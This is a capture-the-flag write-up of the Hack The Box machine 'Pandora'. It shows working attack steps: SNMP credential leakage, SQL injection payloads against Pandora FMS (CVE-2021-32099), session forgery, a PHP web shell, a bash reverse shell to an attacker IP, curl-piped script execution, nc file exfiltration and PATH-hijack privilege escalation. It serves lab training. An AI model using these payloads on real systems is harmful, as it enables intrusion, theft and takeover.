---
title:  "HTB - Pandora"
tags:
  - cs/hacking
  - cs/hacking/htb
  - cs/hacking/writeup
programming-languages:
created: 2022-07-18
---
# HTB - Pandora
---
We first enumerate:

```bash
sudo nmap -sC -sV -oA pandora 10.10.11.136
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:02 BST
Nmap scan report for 10.10.11.136
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 secon
```

So we have **Apache 2.4.41** on port 80 and **SSH** 8.2p1 on port 22, we are running Ubuntu.

Let's add it to our localhost by editing `/etc/hosts`, adding `pandora.htb` and checking the website out.

Let's try sending stuff using the form:

![Screenshot from 2022-07-18 11-15-52](notes/images/Screenshot%20from%202022-07-18%2011-15-52.png)

We also set up a `nc -lnvp 80`, but didn't really receive anything.

We get the url `http://pandora.htb/?fullName=hanato&email=hanato%40morioh.cool&phone=%2B885+1234+3244+987&message=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.12%2Ftest%22%3E%3C%2Fimg%3E%3Ca+href%3D%22http%3A%2F%2F10.10.14.12%2F%22%3Eclick+here%3C%2Fa%3E`.

Let's gobust-it:

```bash
gobuster dir -u http://10.10.11.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out
```

We can look at the UDP ports I guess, it will take a while though (around 10min):

```bash
sudo nmap -sU 10.10.11.136 -v

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:41 BST
Initiating Ping Scan at 11:41
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 11:41, 0.03s elapsed (1 total hosts)
Initiating UDP Scan at 11:41
Scanning pandora.htb (10.10.11.136) [1000 ports]
Increasing send delay for 10.10.11.136 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.136 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.136 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.136 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.136 from 400 to 800 due to max_successful_tryno increase to 8
UDP Scan Timing: About 4.48% done; ETC: 11:52 (0:11:01 remaining)
Increasing send delay for 10.10.11.136 from 800 to 1000 due to 11 out of 27 dropped probes since last increase.
UDP Scan Timing: About 7.41% done; ETC: 11:54 (0:12:42 remaining)
UDP Scan Timing: About 25.33% done; ETC: 11:57 (0:11:59 remaining)
UDP Scan Timing: About 31.03% done; ETC: 11:57 (0:11:09 remaining)
UDP Scan Timing: About 36.83% done; ETC: 11:57 (0:10:19 remaining)
UDP Scan Timing: About 42.55% done; ETC: 11:57 (0:09:28 remaining)
UDP Scan Timing: About 48.17% done; ETC: 11:57 (0:08:38 remaining)
UDP Scan Timing: About 53.27% done; ETC: 11:57 (0:07:47 remaining)
UDP Scan Timing: About 58.48% done; ETC: 11:57 (0:06:56 remaining)
UDP Scan Timing: About 63.58% done; ETC: 11:57 (0:06:05 remaining)
Discovered open port 161/udp on 10.10.11.136
```

We got something in port **161** and according to [this](https://www.speedguide.net/port.php?port=161) it holds the `SNMP` service.

We can use `SNMPWalk` to collect SNMP information. SNMP (Simple Network Management Protocol) is a network monitoring protocol for seamless communication between multiple devices ona network, transmitting messages from the SNMP manager to the SNMP remote at each networking site (more [here](https://www.solarwinds.com/resources/it-glossary/snmp-walk)).

```bash
snmpwalk -c public -v2c 10.10.11.136
```

- `-c`: set the community string (default is public).
- `-v2c`: set version to 2c, which is the most common.

It takes ages so we use this instead:

```bash
snmpbulkwalk -c public -v2c 10.10.11.136 . > snmpwalk.1
```

We can clean the file up:

```bash
grep -oP '::.*?\."' snmpwalk.1 | sort | uniq -c | sort -n
```

Then we can do:

```bash
grep <something> snmpwalk.1 | less -S
grep hrSWRun snmpwalk.1 | less -S
```

We found this:

```bash
HOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"

HOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: "-u daniel -p HotelBabylon23"
```

It seems we a `daniel:HotelBabylon23` login:

```bash
~/htb/pandora > grep hrSWRun snmpwalk.1 |grep 823                                                                                                                                                                                      1m 12s
HOST-RESOURCES-MIB::hrSWRunIndex.823 = INTEGER: 823
HOST-RESOURCES-MIB::hrSWRunName.823 = STRING: "sh"
HOST-RESOURCES-MIB::hrSWRunID.823 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.823 = STRING: "/bin/sh"
HOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunType.823 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.823 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.823 = INTEGER: 0
HOST-RESOURCES-MIB::hrSWRunPerfMem.823 = INTEGER: 604 KBytes

~/htb/pandora > grep hrSWRun snmpwalk.1 |grep 1117
HOST-RESOURCES-MIB::hrSWRunIndex.1117 = INTEGER: 1117
HOST-RESOURCES-MIB::hrSWRunName.1117 = STRING: "host_check"
HOST-RESOURCES-MIB::hrSWRunID.1117 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.1117 = STRING: "/usr/bin/host_check"
HOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: "-u daniel -p HotelBabylon23"
HOST-RESOURCES-MIB::hrSWRunType.1117 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.1117 = INTEGER: runnable(2)
HOST-RESOURCES-MIB::hrSWRunPerfCPU.1117 = INTEGER: 0
HOST-RESOURCES-MIB::hrSWRunPerfMem.1117 = INTEGER: 1360 KBytes
```

We ssh:

```bash
~/htb/pandora > ssh daniel@10.10.11.136                                
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 18 Jul 11:12:54 UTC 2022

  System load:           0.09
  Usage of /:            63.4% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f793

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$
```

We can look into the webserver, `/var/www`.

```bash
daniel@pandora:/var/www/pandora/pandora_console$ find . | grep config.php
```

We get permission denied when trying to access `config.php`, only matt seems to have access:

```bash
daniel@pandora:/var/www/pandora/pandora_console/include$ ls -la config.php 
-rw------- 1 matt matt 413 Dec  3  2021 config.php
```

We can check if matt is running anything with `ps -ef` but he is not. We can also check Apache:

```bash
daniel@pandora:/var/www/pandora/pandora_console/include$ cd /etc/apache2/
daniel@pandora:/etc/apache2$ ls
apache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled
daniel@pandora:/etc/apache2$ cd sites-enabled/
daniel@pandora:/etc/apache2/sites-enabled$ ls
000-default.conf  pandora.conf
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

We can add the ServerName to `/etc/hosts` like so:

```bash
10.10.11.136  pandora.htb  pandora.panda.htb
```

Nop, nothing changed. We type `~C` to go into a ssh menu and start listening. We can check if we are listening:

```bash
ss -lnpt | grep 8000
```

And we are not, so we run:

```bash
ssh> -L 8000:127.0.0.1:80
Forwarding port.

~/htb/pandora > ss -lnpt | grep 8000                                                                                                                                                                                                  err 0|1
LISTEN 0      128        127.0.0.1:8000      0.0.0.0:*    users:(("ssh",pid=161846,fd=8))
LISTEN 0      128            [::1]:8000         [::]:*    users:(("ssh",pid=161846,fd=7)
```

- `-L`: local port forward.

Now we can checkout: `http://localhost:8000`!

![Screenshot from 2022-07-18 12-44-31](notes/images/Screenshot%20from%202022-07-18%2012-44-31.png)

We can now `searchploit Pandora 7`. They seem all to be authenticated, so we need a login.

There is [this](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/) online, which points to [CVE-2021-32099](https://github.com/ibnuuby/CVE-2021-32099).

We need to do something like:

```bash
localhost:8000/pandora_console/include/chart_generator.php?session_id=<injection>

http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' or 1=1-- d
```

It doesn't show `Access Not Granted` so promising. Let's try **Burp**. We intercept it, modify it a bit and save it to file to run `sqlmap`:

![Screenshot from 2022-07-18 12-52-54](notes/images/Screenshot%20from%202022-07-18%2012-52-54.png)

We can now check if it is injectable:

```bash
sqlmap -r pandora.req --batch

GET parameter 'session_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 251 HTTP(s) requests:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-6261' OR 8367=8367#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=1' OR (SELECT 6089 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(6089=6089,1))),0x7170706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mNaD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=1' AND (SELECT 2057 FROM (SELECT(SLEEP(5)))MjXV)-- agCG
---
[12:54:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[12:54:38] [INFO] fetched data logged to text files under '/home/hanato/.local/share/sqlmap/output/localhost'

[*] ending @ 12:54:38 /2022-07-18/

---

sqlmap -r pandora.req --batch -D pandora --tables

+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+

[12:57:46] [INFO] fetched data logged to text files under '/home/hanato/.local/share/sqlmap/output/localhost'

---

sqlmap -r pandora.req --batch -D pandora -T usuario --dump

```

Let's also try:

```bash
time sqlmap -r pandora.req --dump -D pandora --batch --thread 10
```

And see how long it take. We can look at the output using `less` by running:

```bash
less ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv -S
```

- `-S`: line breaks.

Now we have:

```bash
matt@pandora.htb f655f807365b6dc602b31ab3d6d43acc
daniel@pandora.htb 76323c174bd49ffbbdedf678f6cc89a6
```

We can do:

```bash
sqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump
```

To find out the sessions! We will take one:

```bash
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
```

And put it in the URL, like so `http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq` and refresh `http://localhost:8000/pandora_console/`. We get it!

![Screenshot from 2022-07-18 13-13-50](notes/images/Screenshot%20from%202022-07-18%2013-13-50.png)

Matt doesn't seem to be an admin. Let's try some other things.

We can do:

```bash
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1-- -
```

Because we have 3 `tsessions_php` entries, we enter:

```bash
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1' union select 1,2,3-- -
```

Which gets rid of the error message. Now we can do:

```bash
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27--%20-
```

And we are in! We can see that the in `Admin tools -> File manager` we get put in `/images/`, so lets try to upload something there. The URL is `http://localhost:8000/pandora_console/images/`. Our shell:

```php
<?php                                                                             
system($_REQUEST['cmd']);                                                                                                                                                                                                                   
?>
```

We can upload it, then execute it. It doesn't display anything but we can run `http://localhost:8000/pandora_console/images/shell.php?cmd=whoami` and we get `matt`!

We can open it in **Burp**, send it to the `Repeater` and convert the request type to **POST**. Then we change `cmd` to:

```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1'
```

Make sure to `ctrl+u` it to encode it to URL. We are in!

```bash
~/htb/pandora > nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.136 59342
bash: cannot set terminal process group (871): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ges$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
```

Then we `ctrl+z` it and run:

```bash
stty raw -echo; fg

ENTER
ENTER
```

Now we have proper shell.

We can run **LinPEAS**. We download it, then run a `python http` server and curl from it:

```bash
curl http://10.10.14.12:8001/linpeas.sh | bash
```

There's this:

```bash
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

From their website: We discovered a Local Privilege Escalation (from any user to root) in
polkit's pkexec, a SUID-root program that is installed by default on
every major Linux distribution:

"Polkit (formerly PolicyKit) is a component for controlling system-wide
privileges in Unix-like operating systems. It provides an organized way
for non-privileged processes to communicate with privileged ones. [...]
It is also possible to use polkit to execute commands with elevated
privileges using the command pkexec followed by the command intended to
be executed (with root permission)." (Wikipedia)

So we check for `pkexec`!

```bash
matt@pandora:/home/matt$ pkexec --version
pkexec version 0.105
```

Nice. We also see:

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup (Unknown SUID binary)
```

Matt seems to have access to it.

```bash
matt@pandora:/home/matt$ file /usr/bin/pandora_backup   
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
```

We can `netcat` the file over:

```bash
matt@pandora:/home/matt$ nc 10.10.14.12 9002 < /usr/bin/pandora_backup

~/htb/pandora > nc -nlvp 9002 > pandora_backup
Listening on 0.0.0.0 9002
Connection received on 10.10.11.136 36352

~/htb/pandora > md5sum pandora_backup 
172b42e4a9c9de0d155c357c733ff80f  pandora_backup

matt@pandora:/home/matt$ md5sum /usr/bin/pandora_backup 
172b42e4a9c9de0d155c357c733ff80f  /usr/bin/pandora_backup
```

However when we try to run it:

```bash
matt@pandora:/home/matt$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

We can run **strings** on it and find `tar`:

```bash
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_consol
```

So it is vulnerable to path injection. But we can:

```bash
matt@pandora:/home/matt$ echo /bin/bash > tar
matt@pandora:/home/matt$ tar
tar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options
Try 'tar --help' or 'tar --usage' for more information.
```

We can add our directory to PATH:

```bash
matt@pandora:/home/matt$ export PATH=/home/matt:$PATH 
matt@pandora:/home/matt$ echo $PATH                  
/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

matt@pandora:/home/matt$ chmod +x tar
matt@pandora:/home/matt$ which tar
/home/matt/tar

matt@pandora:/home/matt$ /usr/bin/pandora_backup        
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
```

BAMMN! We can do create a `.ssh/` dir in matt and then:

```bash
ssh-keygen -f matt
```

Send it to matt via a `python http` server. We move it to `authorised_keys` and then ssh into it.

Now we can actually do:

```bash
matt@pandora: export PATH=$(pwd)=$PATH

matt@pandora:/home/matt$ /usr/bin/pandora_backup        
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
```

And we are root!!